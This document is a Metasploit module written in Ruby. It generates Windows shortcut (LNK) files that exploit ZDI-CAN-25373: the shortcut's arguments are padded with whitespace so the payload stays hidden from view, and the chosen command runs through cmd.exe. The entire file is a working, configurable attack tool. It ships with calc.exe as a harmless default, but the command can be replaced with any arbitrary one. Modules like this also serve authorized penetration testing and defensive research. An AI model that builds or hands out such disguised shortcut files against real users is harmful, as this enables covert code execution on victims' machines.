##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
    include Msf::Exploit::FILEFORMAT
  
    def initialize(info = {})
      super(update_info(info,
        'Name'           => 'ZDI-CAN-25373 - Windows Shortcut (LNK) Padding',
        'Description'    => %q{
          This module generates Windows LNK (shortcut) file that can execute
          arbitrary commands. The LNK file uses environment variables and execute 
          its arguments from COMMAND_LINE_ARGUMENTS with extra juicy whitespace 
          character padding bytes and concatenates the actual payload.
        },
        'License'        => MSF_LICENSE,
        'Author'         => [ 'Nafiez' ],
        'References'     => [
          ['URL', 'https://zeifan.my/Windows-LNK/'],
          ['URL', 'https://gist.github.com/nafiez/1236cc4c808a489e60e2927e0407c8d1'],
          ['URL', 'https://www.trendmicro.com/en_us/research/25/c/windows-shortcut-zero-day-exploit.html']
        ],
        'Platform'       => 'win',
        'Targets'        => [ [ 'Windows', {} ] ],
        'DefaultTarget'  => 0,
        'DisclosureDate' => '2025-07-19'
      ))
  
      register_options([
        OptString.new('FILENAME', [ true, 'The LNK filename to generate', 'poc.lnk' ]),
        OptString.new('COMMAND', [ true, 'Command to execute', 'C:\\Windows\\System32\\calc.exe' ]),
        OptString.new('DESCRIPTION', [ true, 'LNK file description', 'testing purpose' ]),
        OptString.new('ICON_PATH', [ true, 'Icon path for the LNK file', 'your_icon_path\\WindowsBackup.ico' ]),
        OptInt.new('BUFFER_SIZE', [ true, 'Buffer size before payload', 900 ])
      ])
    end
  
    def run
      filename = datastore['FILENAME']
      command = datastore['COMMAND']
      description = datastore['DESCRIPTION']
      icon_path = datastore['ICON_PATH']
      buffer_size = datastore['BUFFER_SIZE']
  
      print_status("Generating LNK file: #{filename}")
      
      lnk_data = generate_lnk_file(command, description, icon_path, buffer_size)
      
      file_create(lnk_data)
      
      print_good("Successfully created #{filename}")
      print_status("Command line buffer size: #{buffer_size} bytes")
      print_status("Target command: #{command}")
    end
  
    private
  
    def generate_lnk_file(command, description, icon_path, buffer_size)
      data = "".force_encoding('ASCII-8BIT')    
      data << create_shell_link_header()
      data << create_string_data(description)
      
      cmd_buffer = create_command_buffer(command, buffer_size)
  
      data << create_string_data(cmd_buffer)
      data << create_string_data(icon_path)    
      data << create_environment_block()
      
      return data
    end
  
    def create_shell_link_header
      header = "".force_encoding('ASCII-8BIT')
      header << [0x0000004C].pack('V')    
      header << [0x00021401].pack('V')  
      header << [0x0000].pack('v')      
      header << [0x0000].pack('v')      
      header << [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46].pack('C8')
      
      link_flags = 0x00000004 |  
                   0x00000020 |  
                   0x00000040 |  
                   0x00000080 |  
                   0x00000200 |  
                   0x02000000    
      
      header << [link_flags].pack('V')    
      header << [0x00000000].pack('V')    
      header << [0x00000000, 0x00000000].pack('VV')
      header << [0x00000000, 0x00000000].pack('VV')
      header << [0x00000000, 0x00000000].pack('VV')
      header << [0].pack('V')    
      header << [0].pack('V')
      header << [0x00000007].pack('V')    
      header << [0].pack('v')    
      header << [0].pack('v')
      header << [0].pack('V')
      header << [0].pack('V')
      
      return header
    end
  
    def create_string_data(str)
      data = "".force_encoding('ASCII-8BIT')
      
      data << [str.length].pack('v')
      
      unicode_str = str.encode('UTF-16LE').force_encoding('ASCII-8BIT')
      data << unicode_str
      
      return data
    end
  
    def create_command_buffer(command, buffer_size)
      cmd_command = "/c #{command}"
      
      cmd_len = cmd_command.length
      fill_bytes = buffer_size - cmd_len
      
      if fill_bytes > 0
        buffer = " " * fill_bytes + cmd_command
      else
        buffer = cmd_command
      end
      
      buffer = buffer[0, buffer_size] if buffer.length > buffer_size
      buffer << "\x00"
      
      return buffer
    end
  
    def create_environment_block
      data = "".force_encoding('ASCII-8BIT')
      
      block_size = 0x00000314
      data << [block_size].pack('V')
      
      signature = 0xA0000001
      data << [signature].pack('V')
      
      env_path = "%windir%\\system32\\cmd.exe"
      
      ansi_buffer = env_path.ljust(260, "\x00")[0, 260].force_encoding('ASCII-8BIT')
      data << ansi_buffer
      
      unicode_buffer = env_path.encode('UTF-16LE')
      unicode_buffer = unicode_buffer.ljust(520, "\x00".force_encoding('UTF-16LE'))[0, 520].force_encoding('ASCII-8BIT')
      data << unicode_buffer
      
      return data
    end
  end 